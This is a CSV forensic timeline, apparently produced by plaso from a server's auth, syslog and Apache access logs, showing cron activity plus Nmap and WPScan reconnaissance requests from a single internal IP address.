date,time,timezone,MACB,source,sourcetype,type,user,host,short,desc,version,filename,inode,notes,format,extra
01/18/2022,12:17:01,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[CRON  pid: 28569] pam_unix(cron:session): session opened for user root by (u...,[CRON  pid: 28569] pam_unix(cron:session): session opened for user root by (uid=0),2,OS:D:\dataset\evidences\auth.log,-,-,text/syslog_traditional,sha256_hash: a487d742977818adc4796645f4c842477780cc42ab44b6faf440102ad5e205d2
01/18/2022,12:17:01,UTC,M...,LOG,Cron log,Content Modification Time,root,intranet-server,(root) CMD (   cd / && run-parts --report /etc/cron.hourly),Cron ran: cd / && run-parts --report /etc/cron.hourly for user: root pid: 28570,2,OS:D:\dataset\evidences\syslog,-,-,text/syslog_traditional,reporter: CRON; sha256_hash: 9ace5ff984bb2a2a8b0491d3a2a5aa7f7f134843d7693cdb4706c28dfedf5fe9
01/18/2022,12:17:01,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[CRON  pid: 28569] pam_unix(cron:session): session closed for user root,[CRON  pid: 28569] pam_unix(cron:session): session closed for user root,2,OS:D:\dataset\evidences\auth.log,-,-,text/syslog_traditional,sha256_hash: a487d742977818adc4796645f4c842477780cc42ab44b6faf440102ad5e205d2
01/18/2022,12:17:31,UTC,M...,LOG,Log File,Content Modification Time,-,intranet-server,[sshd  pid: 28573] Did not receive identification string from 172.17.130.196 ...,[sshd  pid: 28573] Did not receive identification string from 172.17.130.196 port 52000,2,OS:D:\dataset\evidences\auth.log,-,-,text/syslog_traditional,sha256_hash: a487d742977818adc4796645f4c842477780cc42ab44b6faf440102ad5e205d2
01/18/2022,12:17:43,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /HNAP1 HTTP/1.1 from: 172.17.130.196,http_request: GET /HNAP1 HTTP/1.1 from: 172.17.130.196 code: 404 user_agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 3263; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:17:43,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /HNAP1 HTTP/1.1 from: 172.17.130.196,http_request: GET /HNAP1 HTTP/1.1 from: 172.17.130.196 code: 404 user_agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 360; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:17:43,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /nmaplowercheck1642508263 HTTP/1.1 from: 172.17.130.196,http_request: GET /nmaplowercheck1642508263 HTTP/1.1 from: 172.17.130.196 code: 404 user_agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 3263; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:17:43,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /nmaplowercheck1642508263 HTTP/1.1 from: 172.17.130.196,http_request: GET /nmaplowercheck1642508263 HTTP/1.1 from: 172.17.130.196 code: 404 user_agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 360; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:17:43,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /sdk HTTP/1.1 from: 172.17.130.196,http_request: POST /sdk HTTP/1.1 from: 172.17.130.196 code: 404 user_agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 3263; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:17:43,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,POST /sdk HTTP/1.1 from: 172.17.130.196,http_request: POST /sdk HTTP/1.1 from: 172.17.130.196 code: 404 user_agent: Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 360; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:17:50,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET / HTTP/1.1 from: 172.17.130.196,http_request: GET / HTTP/1.1 from: 172.17.130.196 code: 200 referer: https://intranet.price.fox.org user_agent: WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 6134; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:17:50,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET / HTTP/1.1 from: 172.17.130.196,http_request: GET / HTTP/1.1 from: 172.17.130.196 code: 200 referer: https://intranet.price.fox.org user_agent: WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 9130; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:17:50,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,HEAD / HTTP/1.1 from: 172.17.130.196,http_request: HEAD / HTTP/1.1 from: 172.17.130.196 code: 200 referer: https://intranet.price.fox.org user_agent: WPScan v3.8.20 (https://wpscan.com/wordpress-security-scanner),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 223; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:37:49,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/js/tinymce/skins/wordpress/images/zoom HTTP/1.1 from: 172.17...,http_request: GET /wp-includes/js/tinymce/skins/wordpress/images/zoom HTTP/1.1 from: 172.17.130.196 code: 404 user_agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 363; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:37:49,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/js/tinymce/skins/wordpress/images/zope HTTP/1.1 from: 172.17...,http_request: GET /wp-includes/js/tinymce/skins/wordpress/images/zope HTTP/1.1 from: 172.17.130.196 code: 404 user_agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 363; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
01/18/2022,12:37:49,UTC,....,LOG,Apache Access Log,Recorded Time,-,-,GET /wp-includes/js/tinymce/skins/wordpress/images/zorum HTTP/1.1 from: 172.1...,http_request: GET /wp-includes/js/tinymce/skins/wordpress/images/zorum HTTP/1.1 from: 172.17.130.196 code: 404 user_agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1),2,OS:D:\dataset\evidences\apache2\access.log,-,-,text/apache_access,http_response_bytes: 363; sha256_hash: f2f46e39d255a41dd5c89d296b0f27c3a32b13109e6188d7485ed9fd128a753c
